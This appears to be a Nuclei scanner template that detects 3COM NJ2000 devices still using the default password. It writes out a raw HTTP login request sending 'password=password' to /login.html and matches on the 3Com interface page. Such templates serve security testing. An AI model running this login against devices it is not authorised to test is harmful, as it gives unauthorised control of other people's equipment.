id: 3com-nj2000-default-login

info:
  name: 3COM NJ2000 - 默认登录
  author: HuanXiong
  severity: high
  description: |
    3COM NJ2000设备存在默认登录漏洞，使用默认密码"password"可以登录设备管理界面。
  tags: iot,default-login

http:
  - raw:
      - |
        POST /login.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        Connection: close

        password=password

    matchers:
      - type: dsl
        name: 默认密码登录
        dsl: "status_code==200 && contains_all(body,'<title>3Com Corporation Web Interface</title>','<frame name=\"mainFrame\" src=\"blank.html\">')"
